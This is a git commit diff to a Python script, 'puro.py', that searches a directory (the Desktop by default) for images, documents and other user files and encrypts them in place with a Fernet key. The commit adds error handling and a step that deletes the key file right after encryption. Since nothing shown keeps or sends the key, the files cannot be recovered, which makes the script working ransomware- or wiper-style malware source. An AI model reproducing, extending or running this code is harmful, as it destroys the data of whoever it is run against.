afd8e0bea9cc84e3b0698af47c81cbdfb054bb7f
Echoflux <28-4213@student.abqseeb.edu.om>
2025-01-29 10:15:17 +0400

    Update puro.py

--- puro.py
+++ puro.py
@@ -5,7 +5,6 @@ from cryptography.fernet import Fernet
 
 ######################## ARGUMENTS ########################
 
-# We will only encrypt, so no need for key arguments here.
 parser = argparse.ArgumentParser(description='Encrypt files in a directory.')
 parser.add_argument('-d', '--directory', type=str, metavar='', help='Directory to search for files to encrypt', default='Desktop')
 args = parser.parse_args()
@@ -18,7 +17,6 @@ def navigate_to_target_directory(directory_name):
     return folder_location
 
 def get_files_in_dir(current_directory):
-    # Expanded list of file types to include additional formats
     targeted_file_types = [
         '.png', '.jpg', '.jpeg', '.gif', '.bmp', '.tiff',  # Image formats
         '.doc', '.docx', '.odt',  # Document formats
@@ -44,24 +42,32 @@ def generate_key():
     key = Fernet.generate_key()
     with open('cryptographic_key.key', 'wb') as key_file:
         key_file.write(key)
+    return key
 
-def encrypt_files(file_list):
-    with open(f'{pathlib.Path(__file__).parent.absolute()}/cryptographic_key.key', 'rb') as key_file:
-        cryptographic_key = key_file.read()
-    fernet = Fernet(cryptographic_key)
+def encrypt_files(file_list, key):
+    fernet = Fernet(key)
     if file_list:
         for document in file_list:
-            with open(document, 'rb') as file:
-                document_original = file.read()
-            document_criptat = fernet.encrypt(document_original)
-            with open(document, 'wb') as encrypted_document:
-                encrypted_document.write(document_criptat)
+            try:
+                with open(document, 'rb') as file:
+                    document_original = file.read()
+                document_criptat = fernet.encrypt(document_original)
+                with open(document, 'wb') as encrypted_document:
+                    encrypted_document.write(document_criptat)
+            except Exception as e:
+                print(f"Error encrypting {document}: {e}")
     else:
         print('No document in directory')
 
+def secure_delete_key(key_path):
+    try:
+        os.remove(key_path)
+        print("Encryption key securely deleted.")
+    except Exception as e:
+        print(f"Error deleting key: {e}")
+
 ######################## DISPLAY ASCII ########################
 
-# Display the ASCII art on the screen
 ascii_art = '''
            %%+                    +%%             
           @@@@*                 =@@%@@            
@@ -98,17 +104,12 @@ ascii_art = '''
     :@@######%@@#################@@#######@@
 '''
 
-# Print ASCII art
 print(ascii_art)
 
 ######################## RUNNING THE ENCRYPTION ########################
 
-# Generate a cryptographic key for encryption
-generate_key()
-
-# Navigate to the target directory and get files
 directory = navigate_to_target_directory(args.directory)
 documents = get_files_in_dir(directory)
-
-# Encrypt the files
-encrypt_files(documents)
+key = generate_key()
+encrypt_files(documents, key)
+secure_delete_key('cryptographic_key.key')
